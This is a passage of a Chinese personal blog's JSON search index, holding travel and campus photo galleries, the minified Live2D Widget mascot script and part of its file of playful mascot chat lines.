西安 古都风韵，千年岁月流转，兵马俑守望着长安城的沉睡故事。 /gallery/travel/xi-an/ https://oss.fyz666.xyz/blogfiles/webp/effdd33c7bab3bb8047f87a7a3627cff.webp %}\n{% galleryGroup 西藏 雪域高原的灵魂，珠穆朗玛峰下，信仰与自然和谐共舞。 /gallery/travel/tibet/ https://oss.fyz666.xyz/blogfiles/webp/1bcf79f79932fb629c32db1e6be40724.webp %}\n{% galleryGroup 厦门 海上花园城市，鼓浪屿的音符轻拂着碧海蓝天，温婉如诗。 /gallery/travel/xiamen/ https://oss.fyz666.xyz/blogfiles/webp/cb85f8b73f681be504f72cc78c066dff.webp %}\n{% galleryGroup 广东 南国明珠，珠江水悠悠，融合了岭南文化与现代繁华的韵味。 /gallery/travel/guangdong/ https://oss.fyz666.xyz/blogfiles/webp/caeaa4457b24366a4bfc9c9df112c174.webp %}\n{% galleryGroup 内蒙古 草原的呼唤，蓝天下马儿奔腾，风中传唱着草原的歌。 /gallery/travel/neimenggu/ https://oss.fyz666.xyz/blogfiles/webp/81914f358bc188ae69589a0bcc587e69.webp %}\n{% galleryGroup 桐庐 江南秘境，山水间隐逸着古镇的宁静，河畔映照着岁月的风雅，诉说着浓郁的文化与自然的和谐交融。 /gallery/travel/tonglu/ https://oss.fyz666.xyz/blogfiles/webp/486d6e89614c12a1bfd810f1d39563ee.webp %}\n{% galleryGroup 长沙 潇湘辣韵的传承者，湘江之畔，岳麓山下，历史与现代交织，火辣美食与革命故事并肩诉说。 /gallery/travel/changsha/ https://oss.fyz666.xyz/blogfiles/webp/7dbd2975ab87ed5d9d20cf872981800a.webp %}\n{% galleryGroup 黄山 中国古画的现实投影，云雾缭绕中的松石奇观，四季变换下的绝美画卷。这里是自然与人文的完美融合。 /gallery/travel/huangshan/ https://oss.fyz666.xyz/blogfiles/jpeg/123df70dd656c7b632f40cb3c5d44f94.jpeg %}\n</div>\n\n{% btn 'javascript:window.history.go(-1);',返回,far fa-hand-point-left,outline blue larger %}\n"},{"title":"你科校内随拍","url":"/gallery/ustc/index.html","content":"\n\n{% gallery %}\n![](https://oss.fyz666.xyz/blogfiles/webp/494c237832a54a4e0a41e01cdef9068f.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/29ac8deb538e1c9d891d0cbcadb2015e.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/64d24617e62ec28904cbd99897abdbce.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/cf3c7fd0527ec3efef58d94e83d7d95f.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/d8caa551c4133a02ea33773ef4219ecf.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/bb0ae7846a2393c50c62f1e9aed5dcea.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/29ed0a230286e6048b50c42e37149fcc.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/a9907d11ae0b30147370a51c39cfbaf4.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/0550b3106df4d43b4aa076c5be85da84.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/ea3e14de216729e74213c2ba01e18407.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/3f713bb822ab12055538bf3bf21ebb1d.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/cb871a1883fc0e4d1eacbee2b42c3893.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/411b422a7f9f0757724722baa1fd1f48.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/37e312e595fbe86498f2f682cb172de4.webp)\n![](https://oss.fyz666.xyz/blogfiles/png/7a3401b3991c46c0f5d30ad514a49f79.png)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/e0722b2a80108fbf3ef456af4bc621c6.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/c8d433eed36e946c4ed0a6eb8733dea6.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/07e25c89513ca4b79a1ea2262be89bcb.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/76c7de12540bc32bcee8e6511f42109f.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/dc1af061863d46c391b348be95e897aa.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/abc6f4df8e93a8ebef4a12af3fdd27c8.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/a6c1617ffb859baf1b583ed5f2c5e193.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/78f465f760a354bc177f391fd2e5520d.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/1a54b899770e23dd51fd36546df312fe.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/3af573d1df13bfe801bea454649bb06b.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/bc95ee6d4f5a452962123323af70d38e.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/286dbcbd756c3631e2083b51056cc406.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/317bf7b917748b290629cebf6083f6bb.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/610fe9efac534bacb4eee4bfb194f013.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/b14b3fb51082f2f0b04f520ec1f48ca5.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/5eee6c8bb5c4b689dd6b6d90a757f0b2.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/dd57b14da102d661783a68667addd5ad.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/e7dae77421879a4d08447e04039f8683.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/8ffd14c71f4d89b55ab843fece9b0825.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/de90d529ab27eabd702ae190dcbc599a.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/e2000965fb853cb35967bc09f30df7fd.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/6599c4c107592ea345526915afbe77ee.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/98ce23e3598477f3d8fe311ee87fa29b.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/4e8416c0fdc604e24add92734d13d3ba.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/db6ba226b4157b5b9d23d80280c99e05.webp)\n![](https://oss.fyz666.xyz/blogfiles/png/40e295aa8bde6cbfd95aba4bdb9e3384.png)\n![](https://oss.fyz666.xyz/blogfiles/webp/43e0642835fa35c0cf1499c26a8214c5.webp)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/8f493de36a33133c87869ae056c87457.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/jpeg/c414f18bb20ea8c8f1f91a431a676305.jpeg)\n![](https://oss.fyz666.xyz/blogfiles/webp/63d781683270c4ea2fc72bbb09a72a80.webp)\n![](https://oss.fyz666.xyz/blogfiles/webp/758a1cdb4ea273e8c04097fd44b2a677.webp)\n{% endgallery %}\n\n{% btn 'javascript:window.history.go(-1);',返回,far fa-hand-point-left,outline blue larger %}\n"},{"url":"/plugins/live2d/waifu-tips.js","content":"/*!\n * Live2D Widget\n * https://github.com/stevenjoezhang/live2d-widget\n */\n!function(){\"use strict\";function e(e){return Array.isArray(e)?e[Math.floor(Math.random()*e.length)]:e}let t;function o(o,s,n){if(!o||sessionStorage.getItem(\"waifu-text\")&&sessionStorage.getItem(\"waifu-text\")>n)return;t&&(clearTimeout(t),t=null),o=e(o),sessionStorage.setItem(\"waifu-text\",n);const i=document.getElementById(\"waifu-tips\");i.innerHTML=o,i.classList.add(\"waifu-tips-active\"),t=setTimeout((()=>{sessionStorage.removeItem(\"waifu-text\"),i.classList.remove(\"waifu-tips-active\")}),s)}class s{constructor(e){let{apiPath:t,cdnPath:o}=e,s=!1;if(\"string\"==typeof o)s=!0,o.endsWith(\"/\")||(o+=\"/\");else{if(\"string\"!=typeof t)throw\"Invalid initWidget argument!\";t.endsWith(\"/\")||(t+=\"/\")}this.useCDN=s,this.apiPath=t,this.cdnPath=o}async loadModelList(){const e=await fetch(`${this.cdnPath}model_list.json`);this.modelList=await e.json()}async loadModel(t,s,n){if(localStorage.setItem(\"modelId\",t),localStorage.setItem(\"modelTexturesId\",s),o(n,4e3,10),this.useCDN){this.modelList||await this.loadModelList();const o=e(this.modelList.models[t]);loadlive2d(\"live2d\",`${this.cdnPath}model/${o}/index.json`)}else loadlive2d(\"live2d\",`${this.apiPath}get/?id=${t}-${s}`),console.log(`Live2D 模型 ${t}-${s} 加载完成`)}async loadRandModel(){const t=localStorage.getItem(\"modelId\"),s=localStorage.getItem(\"modelTexturesId\");if(this.useCDN){this.modelList||await this.loadModelList();const s=e(this.modelList.models[t]);loadlive2d(\"live2d\",`${this.cdnPath}model/${s}/index.json`),o(\"我的新衣服好看嘛？\",4e3,10)}else fetch(`${this.apiPath}rand_textures/?id=${t}-${s}`).then((e=>e.json())).then((e=>{1!==e.textures.id||1!==s&&0!==s?this.loadModel(t,e.textures.id,\"我的新衣服好看嘛？\"):o(\"我还没有其他衣服呢！\",4e3,10)}))}async loadOtherModel(){let e=localStorage.getItem(\"modelId\");if(this.useCDN){this.modelList||await this.loadModelList();const t=++e>=this.modelList.models.length?0:e;this.loadModel(t,0,this.modelList.messages[t])}else fetch(`${this.apiPath}switch/?id=${e}`).then((e=>e.json())).then((e=>{this.loadModel(e.model.id,0,e.model.message)}))}}const n={hitokoto:{icon:'<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\">\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e<path d=\"M512 240c0 114.9-114.6 208-256 208c-37.1 0-72.3-6.4-104.1-17.9c-11.9 8.7-31.3 20.6-54.3 30.6C73.6 471.1 44.7 480 16 480c-6.5 0-12.3-3.9-14.8-9.9c-2.5-6-1.1-12.8 3.4-17.4l0 0 0 0 0 0 0 0 .3-.3c.3-.3 .7-.7 1.3-1.4c1.1-1.2 2.8-3.1 4.9-5.7c4.1-5 9.6-12.4 15.2-21.6c10-16.6 19.5-38.4 21.4-62.9C17.7 326.8 0 285.1 0 240C0 125.1 114.6 32 256 32s256 93.1 256 208z\"/></svg>',callback:function(){fetch(\"https://v1.hitokoto.cn\").then((e=>e.json())).then((e=>{const t=`这句一言来自 <span>「${e.from}」</span>，是 <span>${e.creator}</span> 在 hitokoto.cn 投稿的。`;o(e.hitokoto,6e3,9),setTimeout((()=>{o(t,4e3,9)}),6e3)}))}},asteroids:{icon:'<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\">\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e<path d=\"M498.1 5.6c10.1 7 15.4 19.1 13.5 31.2l-64 416c-1.5 9.7-7.4 18.2-16 23s-18.9 5.4-28 1.6L277.3 424.9l-40.1 74.5c-5.2 9.7-16.3 14.6-27 11.9S192 499 192 488V392c0-5.3 1.8-10.5 5.1-14.7L362.4 164.7c2.5-7.1-6.5-14.3-13-8.4L170.4 318.2l-32 28.9 0 0c-9.2 8.3-22.3 10.6-33.8 5.8l-85-35.4C8.4 312.8 .8 302.2 .1 290s5.5-23.7 16.1-29.8l448-256c10.7-6.1 23.9-5.5 34 1.4z\"/></svg>',callback:()=>{if(window.Asteroids)window.ASTEROIDSPLAYERS||(window.ASTEROIDSPLAYERS=[]),window.ASTEROIDSPLAYERS.push(new Asteroids);else{const e=document.createElement(\"script\");e.src=\"https://fastly.jsdelivr.net/gh/stevenjoezhang/asteroids/asteroids.js\",document.head.appendChild(e)}}},\"switch-model\":{icon:'<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\">\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e<path d=\"M399 384.2C376.9 345.8 335.4 320 288 320H224c-47.4 0-88.9 25.8-111 64.2c35.2 39.2 86.2 63.8 143 63.8s107.8-24.7 143-63.8zM512 256c0 141.4-114.6 256-256 256S0 397.4 0 256S114.6 0 256 0S512 114.6 512 256zM256 272c39.8 0 72-32.2 72-72s-32.2-72-72-72s-72 32.2-72 72s32.2 72 72 72z\"/></svg>',callback:()=>{}},\"switch-texture\":{icon:'<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\">\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e<path d=\"M320 64c0-35.3-28.7-64-64-64s-64 28.7-64 64s28.7 64 64 64s64-28.7 64-64zm-96 96c-35.3 0-64 28.7-64 64v48c0 17.7 14.3 32 32 32h1.8l11.1 99.5c1.8 16.2 15.5 28.5 31.8 28.5h38.7c16.3 0 30-12.3 31.8-28.5L318.2 304H320c17.7 0 32-14.3 32-32V224c0-35.3-28.7-64-64-64H224zM132.3 394.2c13-2.4 21.7-14.9 19.3-27.9s-14.9-21.7-27.9-19.3c-32.4 5.9-60.9 14.2-82 24.8c-10.5 5.3-20.3 11.7-27.8 19.6C6.4 399.5 0 410.5 0 424c0 21.4 15.5 36.1 29.1 45c14.7 9.6 34.3 17.3 56.4 23.4C130.2 504.7 190.4 512 256 512s125.8-7.3 170.4-19.6c22.1-6.1 41.8-13.8 56.4-23.4c13.7-8.9 29.1-23.6 29.1-45c0-13.5-6.4-24.5-14-32.6c-7.5-7.9-17.3-14.3-27.8-19.6c-21-10.6-49.5-18.9-82-24.8c-13-2.4-25.5 6.3-27.9 19.3s6.3 25.5 19.3 27.9c30.2 5.5 53.7 12.8 69 20.5c3.2 1.6 5.8 3.1 7.9 4.5c3.6 2.4 3.6 7.2 0 9.6c-8.8 5.7-23.1 11.8-43 17.3C374.3 457 318.5 464 256 464s-118.3-7-157.7-17.9c-19.9-5.5-34.2-11.6-43-17.3c-3.6-2.4-3.6-7.2 0-9.6c2.1-1.4 4.8-2.9 7.9-4.5c15.3-7.7 38.8-14.9 69-20.5z\"/></svg>',callback:()=>{}},photo:{icon:'<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\">\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e<path d=\"M220.6 121.2L271.1 96 448 96v96H333.2c-21.9-15.1-48.5-24-77.2-24s-55.2 8.9-77.2 24H64V128H192c9.9 0 19.7-2.3 28.6-6.8zM0 128V416c0 35.3 28.7 64 64 64H448c35.3 0 64-28.7 64-64V96c0-35.3-28.7-64-64-64H271.1c-9.9 0-19.7 2.3-28.6 6.8L192 64H160V48c0-8.8-7.2-16-16-16H80c-8.8 0-16 7.2-16 16l0 16C28.7 64 0 92.7 0 128zM344 304c0 48.6-39.4 88-88 88s-88-39.4-88-88s39.4-88 88-88s88 39.4 88 88z\"/></svg>',callback:()=>{o(\"照好了嘛，是不是很可爱呢？\",6e3,9),Live2D.captureName=\"photo.png\",Live2D.captureFrame=!0}},info:{icon:'<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 512 512\">\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e<path d=\"M256 512c141.4 0 256-114.6 256-256S397.4 0 256 0S0 114.6 0 256S114.6 512 256 512zM216 336h24V272H216c-13.3 0-24-10.7-24-24s10.7-24 24-24h48c13.3 0 24 10.7 24 24v88h8c13.3 0 24 10.7 24 24s-10.7 24-24 24H216c-13.3 0-24-10.7-24-24s10.7-24 24-24zm40-144c-17.7 0-32-14.3-32-32s14.3-32 32-32s32 14.3 32 32s-14.3 32-32 32z\"/></svg>',callback:()=>{open(\"https://github.com/stevenjoezhang/live2d-widget\")}},quit:{icon:'<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 320 512\">\\x3c!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --\\x3e<path d=\"M310.6 150.6c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L160 210.7 54.6 105.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3L114.7 256 9.4 361.4c-12.5 12.5-12.5 32.8 0 45.3s32.8 12.5 45.3 0L160 301.3 265.4 406.6c12.5 12.5 32.8 12.5 45.3 0s12.5-32.8 0-45.3L205.3 256 310.6 150.6z\"/></svg>',callback:()=>{localStorage.setItem(\"waifu-display\",Date.now()),o(\"愿你有一天能与重要的人重逢。\",2e3,11),document.getElementById(\"waifu\").style.bottom=\"-500px\",setTimeout((()=>{document.getElementById(\"waifu\").style.display=\"none\",document.getElementById(\"waifu-toggle\").classList.add(\"waifu-toggle-active\")}),3e3)}}};function i(t){const i=new s(t);function c(t){let s,n=!1,i=t.message.default;window.addEventListener(\"mousemove\",(()=>n=!0)),window.addEventListener(\"keydown\",(()=>n=!0)),setInterval((()=>{n?(n=!1,clearInterval(s),s=null):s||(s=setInterval((()=>{o(i,6e3,9)}),2e4))}),1e3),o(function(e){if(\"/\"===location.pathname)for(let{hour:t,text:o}of e){const e=new Date,s=t.split(\"-\")[0],n=t.split(\"-\")[1]||s;if(s<=e.getHours()&&e.getHours()<=n)return o}const t=`欢迎阅读<span>「${document.title.split(\" - \")[0]}」</span>`;let o;if(\"\"!==document.referrer){const e=new URL(document.referrer),s=e.hostname.split(\".\")[1],n={baidu:\"百度\",so:\"360搜索\",google:\"谷歌搜索\"};return location.hostname===e.hostname?t:(o=s in n?n[s]:e.hostname,`Hello！来自 <span>${o}</span> 的朋友<br>${t}`)}return t}(t.time),7e3,11),window.addEventListener(\"mouseover\",(s=>{for(let{selector:n,text:i}of t.mouseover)if(s.target.matches(n))return i=e(i),i=i.replace(\"{text}\",s.target.innerText),void o(i,4e3,8)})),window.addEventListener(\"click\",(s=>{for(let{selector:n,text:i}of t.click)if(s.target.matches(n))return i=e(i),i=i.replace(\"{text}\",s.target.innerText),void o(i,4e3,8)})),t.seasons.forEach((({date:t,text:o})=>{const s=new Date,n=t.split(\"-\")[0],c=t.split(\"-\")[1]||n;n.split(\"/\")[0]<=s.getMonth()+1&&s.getMonth()+1<=c.split(\"/\")[0]&&n.split(\"/\")[1]<=s.getDate()&&s.getDate()<=c.split(\"/\")[1]&&(o=(o=e(o)).replace(\"{year}\",s.getFullYear()),i.push(o))}));const c=()=>{};console.log(\"%c\",c),c.toString=()=>{o(t.message.console,6e3,9)},window.addEventListener(\"copy\",(()=>{o(t.message.copy,6e3,9)})),window.addEventListener(\"visibilitychange\",(()=>{document.hidden||o(t.message.visibilitychange,6e3,9)}))}localStorage.removeItem(\"waifu-display\"),sessionStorage.removeItem(\"waifu-text\"),document.body.insertAdjacentHTML(\"beforeend\",'<div id=\"waifu\">\\n            <div id=\"waifu-tips\"></div>\\n            <canvas id=\"live2d\" width=\"800\" height=\"800\"></canvas>\\n            <div id=\"waifu-tool\"></div>\\n        </div>'),setTimeout((()=>{document.getElementById(\"waifu\").style.bottom=0}),0),function(){n[\"switch-model\"].callback=()=>i.loadOtherModel(),n[\"switch-texture\"].callback=()=>i.loadRandModel(),Array.isArray(t.tools)||(t.tools=Object.keys(n));for(let e of t.tools)if(n[e]){const{icon:t,callback:o}=n[e];document.getElementById(\"waifu-tool\").insertAdjacentHTML(\"beforeend\",`<span id=\"waifu-tool-${e}\">${t}</span>`),document.getElementById(`waifu-tool-${e}`).addEventListener(\"click\",o)}}(),function(){let e=localStorage.getItem(\"modelId\"),o=localStorage.getItem(\"modelTexturesId\");null===e&&(e=1,o=53),i.loadModel(e,o),fetch(t.waifuPath).then((e=>e.json())).then(c)}()}window.initWidget=function(e,t){\"string\"==typeof e&&(e={waifuPath:e,apiPath:t}),document.body.insertAdjacentHTML(\"beforeend\",'<div id=\"waifu-toggle\">\\n            <span>看板娘</span>\\n        </div>');const o=document.getElementById(\"waifu-toggle\");o.addEventListener(\"click\",(()=>{o.classList.remove(\"waifu-toggle-active\"),o.getAttribute(\"first-time\")?(i(e),o.removeAttribute(\"first-time\")):(localStorage.removeItem(\"waifu-display\"),document.getElementById(\"waifu\").style.display=\"\",setTimeout((()=>{document.getElementById(\"waifu\").style.bottom=0}),0))})),localStorage.getItem(\"waifu-display\")&&Date.now()-localStorage.getItem(\"waifu-display\")<=864e5?(o.setAttribute(\"first-time\",!0),setTimeout((()=>{o.classList.add(\"waifu-toggle-active\")}),0)):i(e)}}();\n"},{"url":"/plugins/live2d/waifu-tips.json","content":"{\n\t\"mouseover\": [{\n\t\t\"selector\": \"#live2d\",\n\t\t\"text\": [\"干嘛呢你，快把手拿开～～\", \"鼠…鼠标放错地方了！\", \"你要干嘛呀？\", \"喵喵喵？\", \"怕怕(ノ≧∇≦)ノ\", \"非礼呀！救命！\", \"这样的话，只能使用武力了！\", \"我要生气了哦\", \"不要动手动脚的！\", \"真…真的是不知羞耻！\", \"Hentai！\"]\n\t}, {\n\t\t\"selector\": \"#waifu-tool-hitokoto\",\n\t\t\"text\": [\"猜猜我要说些什么？\", \"我从青蛙王子那里听到了不少人生经验。\"]\n\t}, {\n\t\t\"selector\": \"#waifu-tool-asteroids\",\n\t\t\"text\": [\"要不要来玩飞机大战？\", \"这个按钮上写着「不要点击」。\", \"怎么，你想来和我玩个游戏？\", \"听说这样可以蹦迪！\"]\n\t}, {\n\t\t\"selector\": \"#waifu-tool-switch-model\",\n\t\t\"text\": [\"你是不是不爱人家了呀，呜呜呜～\", \"要见见我的姐姐嘛？\", \"想要看我妹妹嘛？\", \"要切换看板娘吗？\"]\n\t}, {\n\t\t\"selector\": \"#waifu-tool-switch-texture\",\n\t\t\"text\": [\"喜欢换装 PLAY 吗？\", \"这次要扮演什么呢？\", \"变装！\", \"让我们看看接下来会发生什么！\"]\n\t}, {\n\t\t\"selector\": \"#waifu-tool-photo\",\n\t\t\"text\": [\"你要给我拍照呀？一二三～茄子～\", \"要不，我们来合影吧！\", \"保持微笑就好了～\"]\n\t}, {\n\t\t\"selector\": \"#waifu-tool-info\",\n\t\t\"text\": [\"想要知道更多关于我的事么？\", \"这里记录着我搬家的历史呢。\", \"你想深入了解我什么呢？\"]\n\t}, {\n\t\t\"selector\": \"#waifu-tool-quit\",\n\t\t\"text\": [\"到了要说再见的时候了吗？\", \"呜呜 QAQ 后会有期……\", \"不要抛弃我呀……\", \"我们，还能再见面吗……\", \"哼，你会后悔的！\"]\n\t}, {\n\t\t\"selector\": \".menu-item-home a\",\n\t\t\"text\": [\"点击前往首页，想回到上一页可以使用浏览器的后退功能哦。\", \"点它就可以回到首页啦！\", \"回首页看看吧。\"]\n\t}, {\n\t\t\"selector\": \".menu-item-about a\",\n\t\t\"text\": [\"你想知道我家主人是谁吗？\", \"这里有一些关于我家主人的秘密哦，要不要看看呢？\", \"发现主人出没地点！\"]\n\t}, {\n\t\t\"selector\": \".menu-item-tags a\",\n\t\t\"text\": [\"点击就可以看文章的标签啦！\", \"点击来查看所有标签哦。\"]\n\t}, {\n\t\t\"selector\": \".menu-item-categories a\",\n\t\t\"text\": [\"文章都分类好啦～\", \"点击来查看文章分类哦。\"]\n\t}, {\n\t\t\"selector\": \".menu-item-archives a\",\n\t\t\"text\": [\"翻页比较麻烦吗，那就来看看文章归档吧。\", \"文章目录都整理在这里啦！\"]\n\t}, {\n\t\t\"selector\": \".menu-item-friends a\",\n\t\t\"text\": [\"这是我的朋友们哦ヾ(◍°∇°◍)ﾉﾞ\", \"要去大佬们的家看看吗？\", \"要去拜访一下我的朋友们吗？\"]\n\t}, {\n\t\t\"selector\": \".menu-item-search a\",\n\t\t\"text\": [\"找不到想看的内容？搜索看看吧！\", \"在找什么东西呢，需要帮忙吗？\"]\n\t}, {\n\t\t\"selector\": \".menu-item a\",\n\t\t\"text\": [\"快看看这里都有什么呢？\"]\n\t}, {\n\t\t\"selector\": \".site-author\",\n\t\t\"text\": [\"我家主人好看吗？\", \"这是我家主人(*´∇｀*)\"]\n\t}, {\n\t\t\"selector\": \".site-state\",\n\t\t\"text\": [\"这是文章的统计信息～\", \"要不要点进去看看？\"]\n\t}, {\n\t\t\"selector\": \".feed-link a\",\n\t\t\"text\": [\"这里可以使用 RSS 订阅呢！\", \"利用 feed 订阅器，就能快速知道博客有没有更新了呢。\"]\n\t}, {\n\t\t\"selector\": \".cc-opacity, .post-copyright-author\",\n\t\t\"text\": [\"要记得规范转载哦。\", \"所有文章均采用 CC BY-NC-SA 4.0 许可协议～\", \"转载前要先注意下文章的版权协议呢。\"]\n\t}, {\n\t\t\"selector\": \".links-of-author\",\n\t\t\"text\": [\"这里是主人的常驻地址哦。\", \"这里有主人的联系方式！\"]\n\t}, {\n\t\t\"selector\": \".followme\",\n\t\t\"text\": [\"手机扫一下就能继续看，很方便呢～\", \"扫一扫，打开新世界的大门！\"]\n\t}, {\n\t\t\"selector\": \".fancybox img, img.medium-zoom-image\",\n\t\t\"text\": [\"点击图片可以放大呢！\"]\n\t}, {\n\t\t\"selector\": \".copy-btn\",\n\t\t\"text\": [\"代码可以直接点击复制哟。\"]\n\t}, {\n\t\t\"selector\": \".highlight .table-container, .gist\",\n\t\t\"text\": [\"GitHub！我是新手！\", \"PHP 是最好的语言！\"]\n\t}, {\n\t\t\"selector\": \"a[href^='mailto']\",\n\t\t\"text\": [\"邮件我会及时回复的！\", \"点击就可以发送邮件啦～\"]\n\t}, {\n\t\t\"selector\": \"a[href^='/tags/']\",\n\t\t\"text\": [\"要去看看 <span>{text}</span> 标签么？\", \"点它可以查看此标签下的所有文章哟！\"]\n\t}, {\n\t\t\"selector\": \"a[href^='/categories/']\",\n\t\t\"text\": [\"要去看看 <span>{text}</span> 分类么？\", \"点它可以查看此分类下的所有文章哟！\"]\n\t}, {\n\t\t\"selector\": \".post-title-link\",\n\t\t\"text\": [\"要看看 <span>{text}</span> 这篇文章吗？\"]\n\t}, {\n\t\t\"selector\": \"a[rel='contents']\",\n\t\t\"text\": [\"点击来阅读全文哦。\"]\n\t}, {\n\t\t\"selector\": \"a[itemprop='discussionUrl']\",\n\t\t\"text\": [\"要去看看评论吗？\"]\n\t}, {\n\t\t\"selector\": \".beian a\",\n\t\t\"text\": [\"我也是有户口的人哦。\", \"我的主人可是遵纪守法的好主人。\"]\n\t}, {\n\t\t\"selector\": \".container a[href^='http'], .nav-link .nav-text\",\n\t\t\"text\": [\"要去看看 <span>{text}</span> 么？\", \"去 <span>{text}</span> 逛逛吧。\", \"到 <span>{text}</span> 看看吧。\"]\n\t}, {\n\t\t\"selector\": \".back-to-top\",\n\t\t\"text\": [\"点它就可以回到顶部啦！\", \"又回到最初的起点～\", \"要回到开始的地方么？\"]\n\t}, {\n\t\t\"selector\": \".reward-container\",\n\t\t\"text\": [\"我是不是棒棒哒～快给我点赞吧！\", \"要打赏我嘛？好期待啊～\", \"主人最近在吃土呢，很辛苦的样子，给他一些钱钱吧～\"]\n\t}, {\n\t\t\"selector\": \"#wechat\",\n\t\t\"text\": [\"这是我的微信二维码～\"]\n\t}, {\n\t\t\"selector\": \"#alipay\",\n\t\t\"text\": [\"这是我的支付宝哦！\"]\n\t}, {\n\t\t\"selector\": \"#bitcoin\",\n\t\t\"text\": [\"这是我的比特币账号！\"]\n\t}, {\n\t\t\"selector\": \"#needsharebutton-postbottom .btn\",\n\t\t\"text\": [\"好东西要让更多人知道才行哦。\", \"觉得文章有帮助的话，可以分享给更多需要的朋友呢。\"]\n\t}, {\n\t\t\"selector\": \".need-share-button_weibo\",\n\t\t\"text\": [\"微博？来分享一波喵！\"]\n\t}, {\n\t\t\"selector\": \".need-share-button_wechat\",\n\t\t\"text\": [\"分享到微信吧！\"]\n\t}, {\n\t\t\"selector\": \".need-share-button_douban\",\n\t\t\"text\": [\"分享到豆瓣好像也不错！\"]\n\t}, {\n\t\t\"selector\": \".need-share-button_qqzone\",\n\t\t\"text\": [\"QQ 空间，一键转发，耶～\"]\n\t}, {\n\t\t\"selector\": \".need-share-button_twitter\",\n\t\t\"text\": [\"Twitter？好像是不存在的东西？\"]\n\t}, {\n\t\t\"selector\": \".need-share-button_facebook\",\n\t\t\"text\": [\"emmm…FB 好像也是不存在的东西？\"]\n\t}, {\n\t\t\"selector\": \".post-nav-item a[rel='next']\",\n\t\t\"text\": [\"来看看下一篇文章吧。\", \"点它可以看下一篇文章哦！\", \"要翻到下一篇文章吗？\"]\n\t}, {\n\t\t\"selector\": \".post-nav-item a[rel='prev']\",\n\t\t\"text\": [\"来看看上一篇文章吧。\", \"点它可以看上一篇文章哦！\", \"要翻到上一篇文章吗？\"]\n\t}, {\n\t\t\"selector\": \".extend.next\",\n\t\t\"text\": [\"去下一页看看吧。\", \"点它可以前进哦！\", \"要翻到下一页吗？\"]\n\t}, {\n\t\t\"selector\": \".extend.prev\",\n\t\t\"text\": [\"去上一页看看吧。\", \"点它可以后退哦！\", \"要翻到上一页吗？\"]\n\t}, {\n\t\t\"selector\": \"input.vnick\",\n\t\t\"text\": 